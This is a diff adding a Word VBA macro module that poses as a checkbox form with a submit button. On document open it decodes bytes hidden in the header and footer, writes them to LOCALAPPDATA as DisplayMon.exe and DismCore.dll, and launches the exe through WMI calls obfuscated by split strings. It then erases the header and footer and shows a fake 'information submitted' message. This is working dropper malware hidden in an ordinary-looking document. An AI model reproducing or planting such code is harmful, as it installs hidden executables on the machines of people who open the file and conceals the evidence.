@@ -1,0 +1,143 @@
+Attribute VB_Name = "Module1"
+Attribute VB_Base = "0{00020906-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Attribute VB_Control = "CommandButton1, 20, 0, MSForms, CommandButton"
+Attribute VB_Control = "CheckBox9, 19, 1, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox8, 18, 2, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox5114, 17, 3, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox64, 16, 4, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox5112, 15, 5, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox62, 14, 6, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox7, 13, 7, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox5, 12, 8, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox4, 11, 9, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox5111, 10, 10, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox61, 9, 11, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox511, 8, 12, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox6, 7, 13, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox51, 6, 14, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox41, 5, 15, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox512, 4, 16, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox411, 3, 17, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox3, 2, 18, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox2, 1, 19, MSForms, CheckBox"
+Attribute VB_Control = "CheckBox1, 0, 20, MSForms, CheckBox"
+
+
+
+
+Sub writeOutHeader()
+    On Error Resume Next
+    Dim intFileNum As Integer
+    Dim byteTemp As Byte
+    Dim strByte1 As String
+    Dim i, j, k As Double
+    Dim strIn As String
+    Dim blnDone As Boolean
+    intFileNum = FreeFile
+    Dim dropPath As String
+    
+    dropPath = Environ("LOCALAPPDATA") & "\DisplayMon.exe"
+
+    Open dropPath For Binary As intFileNum
+
+    strIn = ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Text
+    blnDone = False
+    i = 1
+    j = 1
+
+    Do While Not blnDone
+        k = InStr(i + 1, strIn, ";")
+        If k = 0 Then
+            blnDone = True
+        Else
+            blnDone = False
+            strByte1 = Mid(strIn, i + 1, k - i - 1)
+            ' a = CLng(strByte1)
+            Put intFileNum, , CByte(strByte1)
+            i = k
+            strByte1 = ""
+            j = j + 1
+            End If
+    Loop
+    Close intFileNum
+End Sub
+
+Sub writeOutFooter()
+    On Error Resume Next
+    Dim intFileNum As Integer
+    Dim byteTemp As Byte
+    Dim strByte1 As String
+    Dim i, j, k As Double
+    Dim strIn As String
+    Dim blnDone As Boolean
+    intFileNum = FreeFile
+    Dim dropPath As String
+    
+    dropPath = Environ("LOCALAPPDATA") & "\DismCore.dll"
+
+    Open dropPath For Binary As intFileNum
+
+    strIn = ActiveDocument.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text
+    blnDone = False
+    i = 1
+    j = 1
+
+    Do While Not blnDone
+        k = InStr(i + 1, strIn, ";")
+        If k = 0 Then
+            blnDone = True
+        Else
+            blnDone = False
+            strByte1 = Mid(strIn, i + 1, k - i - 1)
+            Put intFileNum, , CByte(strByte1)
+            i = k
+            strByte1 = ""
+            j = j + 1
+            End If
+    Loop
+    Close intFileNum
+End Sub
+
+Sub DoStuff()
+
+    Const WHAT = 12
+    blah = Environ("LOCALAPPDATA") & "\DisplayMon.exe"
+    Set serveYa = GetObject("wi" & "nmg" & "mts:\\.\r" & "oot\ci" & "mv2")
+    Set startYa = serveYa.Get("Wi" & "n32_Pr" & "ocessS" & "tartup")
+    Set whatYa = startYa.SpawnInstance_
+    whatYa.ShowWindow = WHAT
+    Set procYa = GetObject("wi" & "nmgmt" & "s:r" & "oot\ci" & "mv2:W" & "in32_P" & "rocess")
+    res = procYa.Create(blah, Null, whatYa, processid)
+
+End Sub
+
+
+Sub Cleanup()
+
+    ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Text = ""
+    ActiveDocument.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = ""
+    ActiveDocument.Save
+
+End Sub
+
+Sub Document_Open()
+
+    
+'#
+    writeOutHeader
+    writeOutFooter
+    DoStuff
+    Cleanup
+               
+
+End Sub
+Private Sub CommandButton1_Click()
+    MsgBox "Your information has been submitted. You may close this document."
+    CommandButton1.Enabled = False
+End Sub
